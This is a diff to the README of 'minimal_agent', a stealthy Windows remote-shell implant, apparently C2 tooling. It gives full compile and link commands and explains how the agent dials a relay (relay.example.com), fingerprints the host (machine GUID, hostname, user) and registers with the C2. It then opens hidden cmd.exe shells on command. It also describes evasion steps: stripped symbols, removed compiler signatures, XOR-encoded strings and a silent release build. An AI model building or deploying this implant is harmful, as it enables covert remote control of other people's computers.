@@ -42,6 +42,9 @@ below).
 
 ### PowerShell (from the repo root)
 
+Sources live in `src\`, headers in `include\` (that is why `-Iinclude`),
+and `entry.c` sits in the root. One command, all 18 files:
+
 ```powershell
 # Compile. Objects land in obj\ so the repo root stays clean.
 #   -O2                        optimize (the flags below assume -O2)
@@ -49,7 +52,7 @@ below).
 #   -fno-shrink-wrap           required companion (see note below)
 #   -fno-ident                 drop the compiler's signature strings
 #   -DLOGGING_ENABLED          OPTIONAL: add this to get terminal logs
-gcc -O2 -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -c entry.c main.c transport.c shell.c report.c system_facts.c winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c peb.c system.c djb2.c logger.c
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -c entry.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
 
 New-Item -ItemType Directory -Force obj | Out-Null   # create obj\ (silent if exists)
 Move-Item *.o obj                                     # move the fresh objects in
@@ -58,25 +61,25 @@ Move-Item *.o obj                                     # move the fresh objects i
 #   -s          strip symbols from the shipped exe
 #   -nostdlib   no CRT - our entry.c is the startup
 #   -e entry    THE entry point is our entry() (omitting this = instant crash)
-gcc -O2 -s -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -nostdlib -e entry -Wl,-T,link.text-first.ld -o minimal_agent.exe (Get-ChildItem obj\*.o | ForEach-Object FullName)
+gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -nostdlib -e entry '-Wl,-T,link.text-first.ld' -o minimal_agent.exe (Get-ChildItem obj\*.o | ForEach-Object FullName)
 ```
 
 ### cmd (classic Command Prompt)
 
 ```bat
 :: same compile, one line - cmd has no line-continuation
-gcc -O2 -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -c entry.c main.c transport.c shell.c report.c system_facts.c winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c peb.c system.c djb2.c logger.c
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -c entry.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
 
 if not exist obj mkdir obj     & :: create obj\
 move *.o obj                   & :: park the objects
 
-gcc -O2 -s -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -nostdlib -e entry -Wl,-T,link.text-first.ld -o minimal_agent.exe obj\*.o
+gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -nostdlib -e entry -Wl,-T,link.text-first.ld -o minimal_agent.exe obj\*.o
 ```
 
 ### bash (MSYS2 shell)
 
 ```sh
-gcc -O2 -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -Iinclude -c entry.c src/main.c src/transport.c src/shell.c src/report.c src/system_facts.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c src/environment.c
+gcc -O2 -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -Iinclude -c entry.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
 mkdir -p obj && mv *.o obj/                      # objects out of the root
 gcc -O2 -s -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -nostdlib -e entry -Wl,-T,link.text-first.ld -o minimal_agent.exe obj/*.o
 ```
@@ -195,10 +198,28 @@ offset (which is `0` now - the build script prints it after linking).
 
 ## Run
 
+The relay URL comes from the **`URL` environment variable** (the
+no-CRT entry point reads it straight from the PEB environment block -
+there is no argv):
+
+```powershell
+$env:URL = "https://relay.example.com"     # your relay, root path (no /agent)
+.\minimal_agent.exe                        # release: silent by design
+.\minimal_agent_dev.exe                    # dev: prints every step
 ```
-minimal_agent.exe <relay-url>        # e.g. https://relay.example.com/agent
-minimal_agent.exe <relay-url> -v     # verbose: also dump every command raw (dev builds)
-```
+
+The URL is the relay ROOT - the deployed relay generation accepts the
+WebSocket upgrade on `/` (a `/agent` suffix gets a 404, the agent
+retries forever).
+
+**Identity is sent automatically.** The X-Agent-* HTTP headers ride the
+WebSocket upgrade request itself (API 1): machine UUID (registry
+MachineGuid, `Guid.ToString()` form), hostname, user, OS version,
+build/commit tags, and the Shell capability bit. Without them the relay
+still accepts the socket but the C2 never registers the agent - its
+windows never open. Every header is built on the stack, XOR-encoded -
+no plaintext in the binary (verify: `strings minimal_agent.exe` must
+print NOTHING about agents).
 
 **A release build prints nothing.** Not even errors. It connects,
 identifies, and serves; the console just sits there while it works -
@@ -212,43 +233,42 @@ other:
 
 ```powershell
 # 1) compile - same flags, plus -DLOGGING_ENABLED
-gcc -O2 -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -DLOGGING_ENABLED -c entry.c main.c transport.c shell.c report.c system_facts.c winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c peb.c system.c djb2.c logger.c
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -DLOGGING_ENABLED -c entry.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
 
 # 2) park the objects in obj\ (separate dir per flavor keeps them apart)
 New-Item -ItemType Directory -Force obj | Out-Null
 Move-Item *.o obj
 
 # 3) link - the flag AGAIN here, and a distinct name
-gcc -O2 -s -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -DLOGGING_ENABLED -nostdlib -e entry -Wl,-T,link.text-first.ld -o minimal_agent_dev.exe (Get-ChildItem obj\*.o | ForEach-Object FullName)
+gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -DLOGGING_ENABLED -nostdlib -e entry '-Wl,-T,link.text-first.ld' -o minimal_agent_dev.exe (Get-ChildItem obj\*.o | ForEach-Object FullName)
 
-# 4) run the talkative one
-.\minimal_agent_dev.exe https://relay.example.com/agent
+# 4) run the talkative one (URL from the environment, see above)
+$env:URL = "https://relay.example.com"
+.\minimal_agent_dev.exe
 ```
 
 It prints:
 
 ```
-[INF] Connecting to https://relay.example.com/agent ...
+[INF] Connecting to https://relay.example.com ...
+[INF] Identity: 356 header bytes on the upgrade request
+
 [INF] Connected (HTTP 101 Switching Protocols)
 
 [INF] [2] Agent mode: replying to commands (capability mask = Shell)...
 
-[INF] Identity sent to the panel (754 bytes)
-
 ```
 
-With `-v` (dev build) every incoming command is additionally dumped:
-opcode name, decoded payload, a hex dump, and the outgoing identity
-frame field by field.
+and one line per panel command as they arrive (`Shell 0 opened`,
+`Write to shell 0`, `Read shell 0 - N byte(s)`, `Exit requested`).
 
 ### What it does on the wire
 
 - connects and upgrades HTTP to WebSocket (an ordinary HTTPS GET with
   `WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET`; the `101 Switching
-  Protocols` response completes the handshake);
-- `Hello` -> the 754-byte identity frame: machine UUID (registry
-  MachineGuid in .NET Guid byte order), hostname, user, OS version,
-  build metadata, and a capability mask with Shell set;
+  Protocols` response completes the handshake), carrying the
+  X-Agent-* identity headers (API 1) - the relay copies them into its
+  events and the C2 registers the agent by its machine UUID;
 - `OpenShell` -> spawns a hidden `cmd.exe` (code page UTF-8) behind
   two pipes; the slot index IS the shell id (256 slots);
 - `WriteShell` / `ReadShell` -> feed input / drain output; reads never
@@ -273,7 +293,8 @@ browser works with zero file opcodes implemented.
 |---|---|
 | `entry.c` | the real process entry: zero `.bss` (a no-op while empty), build argv from the PEB, call agent_main, exit via ExitProcess |
 | `main.c` | `agent_main`: owns process-lifetime state on its frame (shell pool, backoff), bundles it into `agent_ctx`, runs dial/serve/redial |
-| `protocol.h` | opcodes, statuses, the identity frame layout, capability mask |
+| `protocol.h` | opcodes, statuses, API-1 constants, capability mask |
+| `identity_headers.h/.c` | the X-Agent-* identity block for the upgrade request |
 | `wire.h` | tiny little-endian writers (header-only) |
 | `transport.h/.c` | the WebSocket pipe: one reply out (`ws_send`), one assembled message in (`ws_receive`) |
 | `shell.h/.c` | the cmd.exe pool: spawn / write / drain / teardown, 256 slots |
